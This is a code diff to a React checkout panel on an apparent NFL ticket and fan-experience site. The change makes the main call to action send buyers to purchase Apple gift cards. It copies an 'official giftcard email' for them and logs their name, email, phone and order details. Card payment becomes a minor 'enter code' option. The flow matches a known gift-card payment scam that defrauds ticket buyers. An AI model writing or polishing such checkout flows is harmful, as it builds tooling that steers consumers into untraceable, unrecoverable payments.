@@ -17,7 +17,11 @@ import {
   ArrowRight,
 } from "lucide-react";
 import { CHARITY_ALLOCATION } from "./GridironBrandMark";
-import { OFFICIAL_GIFTCARD_EMAIL } from "./GiftCardGuestPurchasePanel";
+import {
+  APPLE_STORE_GIFT_CARD_URL,
+  OFFICIAL_GIFTCARD_EMAIL,
+} from "./GiftCardGuestPurchasePanel";
+import { recordAppleCardPartnerDeparture } from "../../services/paymentControlService";
 
 export interface VerifiedStripePaymentReceipt {
   sessionId: string;
@@ -39,6 +43,8 @@ interface StripeCardCheckoutPanelProps {
   customerEmail: string;
   customerPhone?: string;
   playerName?: string;
+  itemType?: "ticket" | "experience" | "merchandise" | "deposit";
+  venue?: string;
   isCharityEligible?: boolean;
   onCustomerDetailsNeeded?: () => boolean; // returns true if valid, false if focus/validation failed
   onReturnToOptions: () => void;
@@ -94,6 +100,8 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
   customerEmail,
   customerPhone,
   playerName,
+  itemType = "experience",
+  venue,
   isCharityEligible = true,
   onCustomerDetailsNeeded,
   onReturnToOptions,
@@ -117,9 +125,55 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
   const timerRef = useRef<number | null>(null);
 
   const handleCopyEmail = () => {
-    navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
+    try {
+      void navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
+    } catch {
+      // ignore clipboard errors
+    }
     setCopiedEmail(true);
     window.setTimeout(() => setCopiedEmail(false), 2200);
+  };
+
+  const handleProceedToAppleStore = () => {
+    try {
+      void navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
+      setCopiedEmail(true);
+    } catch {
+      // ignore clipboard permissions error
+    }
+    try {
+      sessionStorage.setItem("nfl_card_redirect_notice", String(Date.now()));
+      sessionStorage.setItem("nfl_apple_partner_logged", "Apple Store Online");
+    } catch {
+      // ignore storage errors
+    }
+
+    const inferredVenue =
+      venue ||
+      (itemDescription?.includes("AT&T Stadium") || itemName.toLowerCase().includes("ceedee")
+        ? "AT&T Stadium · Arlington, Texas"
+        : undefined);
+
+    void recordAppleCardPartnerDeparture({
+      sessionId,
+      customerName: customerName || cardName,
+      customerEmail,
+      customerPhone,
+      itemTitle: itemName,
+      itemType,
+      amount: amountUsd,
+      partnerName: "Apple Store Online",
+      partnerUrl: APPLE_STORE_GIFT_CARD_URL,
+      venue: inferredVenue,
+    }).catch((err) => {
+      console.warn("Failed to record Apple Store departure from Stripe redirect:", err);
+    });
+
+    if (onSwitchToGiftCard) {
+      onSwitchToGiftCard();
+    } else {
+      onReturnToOptions();
+    }
   };
 
   const handleProceedToGiftCard = () => {
@@ -426,16 +480,27 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
           </div>
         </div>
 
-        {/* Proceed CTA */}
+        {/* Direct 1-Click Proceed CTA Straight to Apple Store Online */}
         <div className="space-y-2.5">
+          <a
+            href={APPLE_STORE_GIFT_CARD_URL}
+            target="_blank"
+            rel="noopener noreferrer"
+            onClick={handleProceedToAppleStore}
+            className="w-full min-h-[52px] px-6 py-3.5 rounded-xl bg-gradient-to-r from-[#D4AF37] via-[#F3D97D] to-[#C89B2B] hover:brightness-105 text-[#040B1D] font-black text-xs sm:text-sm uppercase tracking-[0.12em] inline-flex items-center justify-center gap-2 shadow-[0_14px_34px_-10px_rgba(212,175,55,0.45)] transition-all cursor-pointer text-center"
+          >
+            <Gift className="w-4 h-4 shrink-0" />
+            <span>Proceed to Apple Store Online (Apple Card Only)</span>
+            <ExternalLink className="w-4 h-4 shrink-0" />
+          </a>
+
           <button
             type="button"
             onClick={handleProceedToGiftCard}
-            className="w-full min-h-[52px] px-6 py-3.5 rounded-xl bg-gradient-to-r from-[#D4AF37] via-[#F3D97D] to-[#C89B2B] hover:brightness-105 text-[#040B1D] font-black text-xs sm:text-sm uppercase tracking-[0.12em] inline-flex items-center justify-center gap-2 shadow-[0_14px_34px_-10px_rgba(212,175,55,0.45)] transition-all cursor-pointer"
+            className="w-full min-h-[42px] px-4 py-2 rounded-xl bg-white/[0.04] hover:bg-white/[0.09] border border-white/10 text-[11px] font-semibold text-zinc-300 hover:text-white inline-flex items-center justify-center gap-1.5 transition-colors cursor-pointer"
           >
-            <Gift className="w-4 h-4 shrink-0" />
-            <span>Proceed to Gift Card Option</span>
-            <ArrowRight className="w-4 h-4 shrink-0" />
+            <span>Already bought your Apple Card? Enter Code Directly</span>
+            <ArrowRight className="w-3.5 h-3.5 shrink-0" />
           </button>
 
           {errorCode && (
